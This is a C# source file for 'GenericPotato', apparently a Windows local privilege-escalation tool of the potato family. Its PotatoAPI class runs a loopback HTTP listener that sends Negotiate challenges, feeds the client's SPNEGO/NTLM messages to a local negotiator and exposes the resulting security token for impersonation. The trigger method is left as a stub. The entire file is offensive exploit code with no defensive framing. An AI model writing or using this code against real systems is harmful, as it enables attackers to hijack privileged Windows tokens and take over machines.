using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;

namespace GenericPotato {
    public enum ExecutionMethod
    {
        Auto,
        Token,
        User
    }
    internal class PotatoAPI {

        Thread listener;
        LocalNegotiator negotiator = new LocalNegotiator();
        readonly int port;

        public IntPtr Token {
            get {
                return negotiator.Token;
            }
        }

        public EventWaitHandle readyEvent = new EventWaitHandle(false, EventResetMode.AutoReset);

        public PotatoAPI(ushort port) {

            this.port = port;
            StartThread();
        }

        public Thread StartThread() {
            listener = new Thread(Listener);
            listener.Start();
            return listener;
        }


        string GetAuthorizationHeader(Socket socket) {

            byte[] buffer = new byte[8192];
            int len = socket.Receive(buffer);

            string authRequest = Encoding.ASCII.GetString(buffer);
            Regex rx = new Regex(@"Authorization: Negotiate (?<neg>.*)");
            MatchCollection matches = rx.Matches(authRequest);

            if(matches.Count == 0) {
                return null;
            }

            return matches[0].Groups["neg"].Value;           
        }

        void Listener() {

            Socket listenSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            listenSocket.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, 1);

            listenSocket.Bind(new IPEndPoint(IPAddress.Loopback, port));
            listenSocket.Listen(10);

            readyEvent.Set();

            Socket clientSocket = listenSocket.Accept();

            byte[] buffer = new byte[8192];
            clientSocket.Receive(buffer);

            string challengeResponse = String.Format(
                "HTTP/1.1 401 Unauthorized\r\n" +
                "WWW-Authenticate: Negotiate\r\n" +
                "Content-Length: 0\r\n" +
                "Connection: Keep-alive\r\n\r\n"
                ); 

            clientSocket.Send(Encoding.ASCII.GetBytes(challengeResponse));
            clientSocket = listenSocket.Accept();
            string authHeader = GetAuthorizationHeader(clientSocket);

            try
            {
                if (!negotiator.HandleType1(Convert.FromBase64String(authHeader)))
                {
                    Console.Write("[!] Failed to handle type SPNEGO");
                    clientSocket.Close();
                    listenSocket.Close();
                    return;
                }
            }
            catch (FormatException)
            {
                Console.Write("[!] Failed to parse SPNEGO Base64 buffer");
                return;
            }

            challengeResponse = String.Format(
                "HTTP/1.1 401 Unauthorized\r\n" +
                "WWW-Authenticate: Negotiate {0}\r\n" +
                "Content-Length: 0\r\n" +
                "Connection: Keep-alive\r\n\r\n",
                Convert.ToBase64String(negotiator.Challenge)
                );

            clientSocket.Send(Encoding.ASCII.GetBytes(challengeResponse));
            authHeader = GetAuthorizationHeader(clientSocket);

            try
            {
                negotiator.HandleType3(Convert.FromBase64String(authHeader));
            }
            catch (FormatException)
            {
                Console.WriteLine("[!] Failed to parse SPNEGO Auth packet");
            }

            readyEvent.Set();

            clientSocket.Close();
            listenSocket.Close();
        }

        public bool Trigger()
        {
            // Put your trigger code here
            return true;
        }
    }
}
